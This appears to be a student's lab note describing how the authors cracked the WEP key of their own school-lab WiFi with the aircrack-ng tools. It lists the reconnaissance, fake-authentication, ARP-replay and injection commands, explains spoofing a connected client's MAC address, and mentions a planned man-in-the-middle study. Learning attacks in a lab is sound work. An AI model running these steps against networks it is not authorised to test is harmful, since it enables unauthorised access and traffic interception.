We were succesfully able to crack our WEP password.
We followed the tuturial @ Pluralsight

We made use of the Alfa that was availabe @ school.

#Steps/Commands

###Wireless Reconnaiccance:
**Window 1**
* iwconfig
* airmon-ng start wlan0
* airodump-ng "INTERFACE"

* airodump-ng --bssid "BSSID" -c "Channel" -w wep_log "INTERFACE"

**New window 3** 
* ifconfig 
* Find own MAC

**New window 4**
* aireplay-ng -1 0 -a "BSSID" -h "client MAC" -e "name connection" "INTERFACE" --ignore-negative-one
* aireplay-ng -3 -b "BSSID" -h "client MAC" "INTERFACE" --ignore-negative-one

**New window 5**
* aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b "BSSID" -h "client MAC" "INTERFACE" --ignore-negative-one
* Use this packet? ENTER

**Problems**
The first time I dind't work. This was because nobody was connected to our WiFi (TinneBrecht). For the hack to succeed, there has to be a host connected. This is because we need traffic on the network. Hoe meer verkeer, hoe makkelijker we de IV's kunnen kraken (TODO vertaal). When there is someone on the network we (attacker) will spoof his MAC adress so the access point thinks we are the computer (host). Now we can also send packets to the access point to speed up the hack!

Next time: Writing a script!

TODO: 
- Bash scripting...
- Ethercap opzoeken (Hoe wachtwoorden "vangen" !?) -> Man in the middle attack
